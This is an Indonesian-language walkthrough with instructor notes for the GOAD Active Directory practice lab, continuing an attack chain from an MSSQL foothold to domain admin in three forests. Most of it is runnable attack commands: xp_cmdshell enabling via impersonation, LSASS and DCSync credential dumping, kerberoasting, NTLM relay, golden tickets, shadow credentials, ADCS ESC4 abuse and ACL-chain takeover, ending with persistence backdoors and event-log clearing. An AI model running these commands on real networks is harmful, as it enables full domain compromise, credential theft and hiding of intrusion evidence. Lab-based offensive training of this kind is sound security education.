# Skenario Lanjutan GOAD — "Fall of the North II: Cross-Forest Conquest"

Lanjutan dari `skenario-goad.md` (berakhir di Fase 8: RDP `jon.snow` ke `castelblack`). Skenario ini memakai struktur & vulnerability yang **terdokumentasi di lab GOAD** (mayfly277 writeup) untuk naik dari foothold menuju Domain Admin `north`, lalu menembus forest `sevenkingdoms.local` dan `essos.local`.

> Catatan penting: `castelblack` (192.168.56.22) menjalankan **Windows Defender = disabled** → tools credential dumping (mimikatz/secretsdump) aman dijalankan di sana.

---

## Fase 9 — Post-Exploitation Lokal di castelblack

Posisi: `jon.snow` (RDP) sekaligus **MSSQL admin** di castelblack.

```powershell
whoami /all
net user
net localgroup Administrators
net share
dir C:\  # cari file sensitif
```

**Pembelajaran:**
- `jon.snow` bukan local admin penuh, tapi punya hak `sysadmin` di MSSQL → pivot utama.
- Cari password tersembunyi: `jeor.mormont` (admin castelblack) **password-nya ada di script SYSVOL**; `samwell.tarly` **password-nya di LDAP description**.

---

## Fase 10 — Eksploitasi MSSQL (castelblack)

Tujuan: naikkan hak di MSSQL via **impersonation**, aktifkan `xp_cmdshell` → eksekusi kode sebagai service account.

```bash
# Login sebagai jon.snow (windows-auth)
mssqlclient.py NORTH/jon.snow:iknownothing@192.168.56.22 -windows-auth

# Di prompt SQL:
enum_impersonate
#  -> samwell.tarly (login) -> sa ; arya.stark (user) -> dbo

EXECUTE AS LOGIN = 'samwell.tarly'
EXECUTE AS LOGIN = 'sa'
# enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell whoami
#  -> NT Service\MSSQLSERVER (SYSTEM-level di castelblack)
```

**Pembelajaran:** impersonation = salah satu privilege escalation MSSQL klasik. Dari `NT Service\MSSQLSERVER` attacker bisa dumping LSASS atau membuat admin baru.

---

## Fase 11 — Credential Dumping (LSASS + SYSVOL + LDAP)

Defender off → jalankan dumping.

```bash
# 11.1) Dump SAM/LSASS/session di castelblack
secretsdump.py NORTH/jon.snow:iknownothing@192.168.56.22

# 11.2) Ambil hash user yang sedang login (robb.stark bot login 3 menit)
secretsdump.py NORTH/jon.snow:iknownothing@192.168.56.22 -just-dc  # atau
mimikatz.exe "sekurlsa::logonpasswords"

# 11.3) Ambil password dari SYSVOL & LDAP description
#   jeor.mormont  -> admin castelblack (password di script SYSVOL)
#   samwell.tarly -> password di LDAP description
```

**Hasil:** hash/plaintext `robb.stark` (session bot), `jeor.mormont` (admin castelblack), `samwell.tarly`.

---

## Fase 12 — Kerberoasting (robb.stark) + GPO Abuse

```bash
# 12.1) robb.stark punya SPN -> kerberoast & crack
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 \
  north.sevenkingdoms.local/jon.snow:iknownothing -outputfile rb.hashes
hashcat -m 13100 -a 0 rb.hashes /usr/share/wordlists/rockyou.txt
#  -> robb.stark = admin di winterfell

# 12.2) samwell.tarly bisa edit GPO "STARKWALLPAPER" -> RCE via GPO
# (tambahkan scheduled task / startup script di GPO tersebut)
```

**Pembelajaran:** `robb.stark` (admin winterfell) & `samwell.tarly` (GPO edit) = jalan menuju DA NORTH.

---

## Fase 13 — NTLM Relay (Responder) → DA NORTH

`eddard.stark` = **DOMAIN ADMIN NORTH** dan bot LLMNR (5 menit); `robb.stark` bot LLMNR (3 menit).

```bash
# Terminal 1: tangkap LLMNR/NBT-NS
sudo responder -I eth0 -wd

# Terminal 2: relay hash ke winterfell
sudo python3 ntlmrelayx.py -tf targets.txt -smb2support -socks
#  targets.txt berisi 192.168.56.11

# Saat eddard.stark memicu LLMNR -> relay berhasil -> sesi sebagai eddard.stark
#  -> DOMAIN ADMIN NORTH TERCAPAI
```

**Pembelajaran:** relay otentikasi (bukan hash crack) → langsung dapat akses tanpa tahu password.

---

## Fase 14 — DCSync NORTH → Golden Ticket

```bash
# Dump krbtgt & semua hash domain
secretsdump.py -just-dc north.sevenkingdoms.local/eddard.stark:'<hash>'@192.168.56.11

# Golden ticket (persistence domain NORTH)
ticketer.py -nthash <krbtgt_nthash> -domain-sid <NORTH-SID> \
  -domain north.sevenkingdoms.local Administrator
```

**Hasil:** kontrol penuh domain `north.sevenkingdoms.local`.

---

## Fase 15 — Cross-Forest via MSSQL Linked Server (castelblack → braavos)

`castelblack` MSSQL punya **link ke braavos** (`jon.snow -> sa`).

```sql
-- dari mssqlclient castelblack
SELECT * FROM openquery("braavos", 'SELECT @@version');
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;
      sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT "braavos";
EXEC ('xp_cmdshell ''whoami''') AT "braavos";
#  -> eksekusi kode di braavos.essos.local (forest ESSOS)
```

**Pembelajaran:** trusted link antar MSSQL menyeberangi batas forest tanpa kredensial tambahan.

---

## Fase 16 — Kompromi ESSOS

Dari foothold di braavos/essos, manfaatkan rantai ACL & ADCS:

```bash
# 16.1) braavos MSSQL: admin khal.drogo; impersonate jorah.mormont -> sa
mssqlclient.py ESSOS/khal.drogo:'<pass>'@192.168.56.31 -windows-auth
#  -> jorah.mormont : Read LAPS password + mssql trusted link

# 16.2) khal.drogo punya GenericAll pada viserys -> shadow credentials
pywhisker.py -d essos.local -u khal.drogo -p '<pass>' \
  --target viserys.targaryen --action add
getST.py -dc-ip 192.168.56.12 -spn cifs/meereen.essos.local \
  -impersonate viserys.targaryen -pfx <cert.pfx>

# 16.3) khal.drogo punya GenericAll pada template ECS4 -> ADCS ESC4
certipy find -u khal.drogo@essos.local -p '<pass>' \
  -dc-ip 192.168.56.12 -vulnerable
certipy template -u khal.drogo@essos.local -p '<pass>' \
  -template ECS4 -save-old -dc-ip 192.168.56.12
certipy req -u khal.drogo@essos.local -p '<pass>' \
  -template ECS4 -ca 'ESSOS-CA' -upn daenerys.targaryen@essos.local

# 16.4) missande: ASREP-roast + GenericAll pada khal.drogo (pivot lain)
```

**Hasil:** sertifikat/TGT sebagai `daenerys.targaryen` → **DOMAIN ADMIN ESSOS**.

---

## Fase 17 — Menembus SEVENKINGDOMS (Root Forest)

Gunakan rantai ACL documented di domain root (melalui trust):

```bash
# Alur ACL (BloodHound):
# tywin.lannister  : password di SYSVOL (cyphered) + ForceChangePassword jaime
#   -> jaime.lannister : GenericWrite joffrey.baratheon
#     -> joffrey.baratheon : WriteDACL tyron.lannister
#       -> tyron.lannister : Self-Membership ke Small Council
#         -> Small Council : AddMember ke Dragonstone
#           -> Dragonstone : WriteOwner Kingsguard
#             -> Kingsguard : GenericAll stannis.baratheon
#               -> stannis.baratheon : GenericAll komputer kingslanding
#                 -> RBCD/computer takeover -> DA

# Jalur cepat (jika user lord.varys didapat):
# lord.varys -> GenericAll pada grup "Domain Admins" + AdminSDHolder
```

```bash
# Contoh RBCD takeover kingslanding via stannis
addcomputer.py ... ; rbcd.py ... ; getST.py ... # (sesuai alur ACL)

# DCSync sevenkingdoms
secretsdump.py -just-dc sevenkingdoms.local/cersei.lannister:'<pass>'@192.168.56.10
```

**Hasil:** `krbtgt` sevenkingdoms → **Full control root forest**.

---

## Fase 18 — Persistence & Cleanup

```bash
# Golden/Silver ticket semua domain (north, sevenkingdoms, essos)
# AdminSDHolder / Skeleton key (perhatikan Defender aktif di DC)
# DSRM / dcsync backdoor / modifikasi ACL
# Hapus jejak: clear event log (wevtutil), tutup sesi RDP
```

---

## Ringkasan Kill-Chain Lanjutan

| Fase | Teknik | Domain | Output |
|---|---|---|---|
| 9 | Local enum | north | foothold validasi |
| 10 | MSSQL impersonation + xp_cmdshell | north | SYSTEM castelblack |
| 11 | LSASS/SYSVOL/LDAP dump | north | hash robb/jeor/samwell |
| 12 | Kerberoast + GPO abuse | north | admin winterfell |
| 13 | NTLM relay (Responder) | north | **DA NORTH** |
| 14 | DCSync + golden ticket | north | kontrol north |
| 15 | MSSQL linked server | north→essos | foothold braavos |
| 16 | Shadow creds + ESC4 + LAPS | essos | **DA ESSOS** |
| 17 | ACL chain + RBCD + DCSync | sevenkingdoms | **DA ROOT** |
| 18 | Persistence | semua | persistensi |

---

## Catatan Pengajar

- **Fase 13** adalah lompatan kunci: relay `eddard.stark` (DA North) tanpa crack password.
- **Fase 15** menunjukkan batas *forest* bisa ditembus lewat MSSQL trusted link (bukan trust AD).
- **Fase 16** ajarkan dua serangan modern: *shadow credentials* (pywhisker) dan ADCS **ESC4** (certipy).
- **Fase 17** gunakan BloodHound untuk memvalidasi rantai ACL yang panjang sebelum eksekusi.
- Defender **aktif** di DC (kingslanding/winterfell/meereen) tapi **off** di castelblack → pilih lokasi dumping dengan bijak.
- Nilai password pastikan sesuai lab (mis. `hodor:hodor`, `rickon.stark` pola `WinterYYYY`, `robb.stark` hasil kerberoast, dsb.) — cek writeup mayfly untuk nilai eksak.
